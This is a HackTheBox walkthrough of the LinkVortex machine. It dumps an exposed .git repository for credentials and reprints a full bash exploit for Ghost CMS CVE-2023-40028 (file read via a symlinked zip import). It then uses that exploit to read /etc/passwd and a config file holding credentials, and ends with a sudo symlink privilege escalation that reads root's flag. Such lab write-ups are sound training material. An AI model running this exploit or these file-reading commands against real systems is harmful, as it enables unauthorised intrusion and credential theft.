---
title: LinkVortex
tags:
  - HackTheBox
  - Easy
  - Linux
  - Fuzzing
  - Git
  - Credential_Dumping
  - CMS
  - GHOST
  - Sudo-Vulnerability
  - Symlinks
date: 2025-01-29T00:00:00Z
---
![](Pasted%20image%2020250129180054.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.47 linkvortex.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- linkvortex.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http
|_http-generator: Ghost 5.58
|_http-title: BitByBit Hardware
| http-robots.txt: 4 disallowed entries 
|_/ghost/ /p/ /email/ /r/
```

So I checked its website:

![](Pasted%20image%2020250129180323.png)

I noticed that the website is using [Ghost CMS](https://ghost.org/):

![](Pasted%20image%2020250129180547.png)

And I found a login page:

![](Pasted%20image%2020250129180845.png)

I also got the Ghost version inspecting the source code `<meta name="generator" content="Ghost 5.58">`:

![](Pasted%20image%2020250129181057.png)

So I decided to perform some vhost enumeration with [Ffuf 🐳](/notes/tools/Ffuf.md):

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://linkvortex.htb/ -H 'Host: FUZZ.linkvortex.htb' -mc 200

[redacted]
dev     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 43ms]
```

So I added it to my known hosts and then inspected the website:

![](Pasted%20image%2020250129181701.png)

Now I performed some enumeration using [dirsearch 📁](/notes/tools/dirsearch.md):

```shell
dirsearch -u http://dev.linkvortex.htb/

[18:22:16] 200 -  201B  - /.git/config                                      
[18:22:16] 200 -   73B  - /.git/description                                 
[18:22:16] 200 -   41B  - /.git/HEAD                                        
[18:22:16] 200 -  557B  - /.git/
[18:22:16] 200 -  620B  - /.git/hooks/                                      
[18:22:16] 200 -  402B  - /.git/info/                                       
[18:22:16] 200 -  240B  - /.git/info/exclude                                
[18:22:16] 200 -  401B  - /.git/logs/
[18:22:16] 200 -  175B  - /.git/logs/HEAD                                   
[18:22:16] 200 -  147B  - /.git/packed-refs                                 
[18:22:16] 200 -  393B  - /.git/refs/                                       
[18:22:16] 200 -  418B  - /.git/objects/
[18:22:16] 200 -  691KB - /.git/index 
```

As I saw a lot of git info, I decided to use the tool [git-dumper](https://github.com/arthaud/git-dumper):

```shell
git-dumper http://dev.linkvortex.htb/.git/ ./results
```

![](Pasted%20image%2020250129182919.png)

I got all the code. So I'll search for dumped passwords:

```shell
find * | grep -iR password

[redacted]
ghost/core/test/unit/api/canary/session.test.js:                password: 'qu33nRul35'
ghost/core/test/unit/api/canary/session.test.js:                password: 'qu33nRul35'
ghost/core/test/unit/api/canary/session.test.js:                password: 'qu33nRul35'

ghost/core/test/regression/api/admin/authentication.test.js:            const password = 'OctopiFociPilfer45';

ghost/core/test/utils/api.js:                password: 'Sl1m3rson99'
ghost/core/test/utils/fixtures/filter-param/index.js:// Password = Sl1m3rson
ghost/core/test/utils/fixtures/filter-param/index.js:        password: '$2a$10$.pZeeBE0gHXd0PTnbT/ph.GEKgd0Wd3q2pWna3ynTGBkPKnGIKZL6',
ghost/core/test/utils/fixtures/filter-param/index.js:        password: '$2a$10$.pZeeBE0gHXd0PTnbT/ph.GEKgd0Wd3q2pWna3ynTGBkPKnGIKZL6',
ghost/core/test/utils/fixtures/filter-param/index.js:        password: '$2a$10$.pZeeBE0gHXd0PTnbT/ph.GEKgd0Wd3q2pWna3ynTGBkPKnGIKZL6'

ghost/core/test/utils/fixtures/export/v4_export.json:            "password": "$2a$10$GKFu8wxSXZNFF/cEmTE0/O1FZIz5uRGwlLmYKRicdCRR.bvBeBsJa",
ghost/core/test/utils/fixtures/export/v4_export.json:            "password": "$2a$10$bp1iRtUQ8GTbLyB/JMSXNuDB3ws9/3R8LrzGFvl5vrkO9rzdLRRru"

ghost/core/test/utils/fixtures/export/v3_export.json:            "password": "$2a$10$r0NpLiq8/.nzyxQrM96dI.JHyhx56MzsVv7xI6K4wzQDeR6gOAi3m"

ghost/core/test/utils/fixtures/export/v3_export.json:            "password": "$2a$10$2bT2p18W82Z7BXAkrUfD..wIzN0kMKbgQrhCUg4d7t15QKof6z3qm"

ghost/core/test/utils/fixtures/export/valid.json:                        "password": "$2a$10$.pZeeBE0gHXd0PTnbT/ph.GEKgd0Wd3q2pWna3ynTGBkPKnGIKABC",

we check if the password is a bcrypt hash already and fall back to

mysql root password: 'root'
```

![](Pasted%20image%2020250129184013.png)

I tried multiple combinations with all the previous passwords and emails and got some creds after a wild: `admin@linkvortex.htb:OctopiFociPilfer45`:

![](Pasted%20image%2020250129184903.png)

![](Pasted%20image%2020250129185057.png)

## Weaponization

I found the following PoC searching for "*ghost 5.58 exploit*" in [synk.io](https://security.snyk.io/vuln/SNYK-JS-GHOST-5843513):
- [CVE-2023-40028](https://github.com/0xyassine/CVE-2023-40028)

```shell
#!/bin/bash

# Exploit Title: Ghost Arbitrary File Read
# Date: 10-03-2024
# Exploit Author: Mohammad Yassine
# Vendor Homepage: https://ghost.org/
# Version: BEFORE [ 5.59.1 ]
# Tested on: [ debian 11 bullseye ghost docker image ]
# CVE : CVE-2023-40028

#THIS EXPLOIT WAS TESTED AGAINST A SELF HOSTED GHOST IMAGE USING DOCKER

#GHOST ENDPOINT
GHOST_URL='http://linkvortex.htb'
GHOST_API="$GHOST_URL/ghost/api/v3/admin/"
API_VERSION='v3.0'

PAYLOAD_PATH="`dirname $0`/exploit"
PAYLOAD_ZIP_NAME=exploit.zip

# Function to print usage
function usage() {
  echo "Usage: $0 -u username -p password"
}

while getopts 'u:p:' flag; do
  case "${flag}" in
    u) USERNAME="${OPTARG}" ;;
    p) PASSWORD="${OPTARG}" ;;
    *) usage
       exit ;;
  esac
done

if [[ -z $USERNAME || -z $PASSWORD ]]; then
  usage
  exit
fi

function generate_exploit()
{
  local FILE_TO_READ=$1
  IMAGE_NAME=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 13; echo)
  mkdir -p $PAYLOAD_PATH/content/images/2024/
  ln -s $FILE_TO_READ $PAYLOAD_PATH/content/images/2024/$IMAGE_NAME.png
  zip -r -y $PAYLOAD_ZIP_NAME $PAYLOAD_PATH/ &>/dev/null
}

function clean()
{
  rm $PAYLOAD_PATH/content/images/2024/$IMAGE_NAME.png
  rm -rf $PAYLOAD_PATH
  rm $PAYLOAD_ZIP_NAME
}

#CREATE COOKIE
curl -c cookie.txt -d username=$USERNAME -d password=$PASSWORD \
   -H "Origin: $GHOST_URL" \
   -H "Accept-Version: v3.0" \
   $GHOST_API/session/ &> /dev/null

if ! cat cookie.txt | grep -q ghost-admin-api-session;then
  echo "[!] INVALID USERNAME OR PASSWORD"
  rm cookie.txt
  exit
fi

function send_exploit()
{
  RES=$(curl -s -b cookie.txt \
  -H "Accept: text/plain, */*; q=0.01" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Accept-Encoding: gzip, deflate, br" \
  -H "X-Ghost-Version: 5.58" \
  -H "App-Pragma: no-cache" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Content-Type: multipart/form-data" \
  -X POST \
  -H "Origin: $GHOST_URL" \
  -H "Referer: $GHOST_URL/ghost/" \
  -F "importfile=@`dirname $PAYLOAD_PATH`/$PAYLOAD_ZIP_NAME;type=application/zip" \
  -H "form-data; name=\"importfile\"; filename=\"$PAYLOAD_ZIP_NAME\"" \
  -H "Content-Type: application/zip" \
  -J \
  "$GHOST_URL/ghost/api/v3/admin/db")
  if [ $? -ne 0 ];then
    echo "[!] FAILED TO SEND THE EXPLOIT"
    clean
    exit
  fi
}

echo "WELCOME TO THE CVE-2023-40028 SHELL"
while true; do
  read -p "file> " INPUT
  if [[ $INPUT == "exit" ]]; then
    echo "Bye Bye !"
    break
  fi
  if [[ $INPUT =~ \  ]]; then
    echo "PLEASE ENTER FULL FILE PATH WITHOUT SPACE"
    continue
  fi
  if [ -z $INPUT  ]; then
    echo "VALUE REQUIRED"
    continue
  fi
  generate_exploit $INPUT
  send_exploit
  curl -b cookie.txt -s $GHOST_URL/content/images/2024/$IMAGE_NAME.png
  clean
done

rm cookie.txt
```

## Exploitation

I ran the exploit:

```shell
./exploit.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
```

![](Pasted%20image%2020250129185822.png)

> It worked! Now I can read passwd

![](Pasted%20image%2020250129190021.png)

Now I remembered the Dockerfile I inspected with the git-dumper:

![](Pasted%20image%2020250129190147.png)

So I'll read the content of `/var/lib/ghost/config.production.json`:

```shell
file> /var/lib/ghost/config.production.json
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
```

> Got user creds: `bob@linkvortex.htb:fibber-talented-worth`

### User flag

So I connected via ssh to the machine and got user flag:

![](Pasted%20image%2020250129190455.png)

## Privilege Escalation

If I run `sudo -l`:

```shell
sudo -l 

[redacted]
User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

So I inspected what the executable did:

```shell
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

The script checks if a PNG file passed as an argument is a symbolic link. If it is, it verifies whether the link points to critical directories such as `/etc` or `/root`. 
- If it does, the script removes the link. 
- If not, it moves the link to a quarantine directory and, optionally, displays its content. 
If the file is not a PNG, the script terminates with an error.

First, I'll create a `flag.txt` that will point to `/root/root.txt`:

```shell
cd
ln -s /root/root.txt flag.txt
```

Now I'll make a shortcut `flag.png` that will point to `flag.txt`, so when you open `flag.png` it will lead to `/root/root.txt`:

```shell
ln -s /home/bob/flag.txt flag.png
```

Finally, I'll execute the script with the `flag.png`:

```shell
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/flag.png
```

### Root flag

> Got root flag :D

![](Pasted%20image%2020250129192146.png)

==Machine pwned!==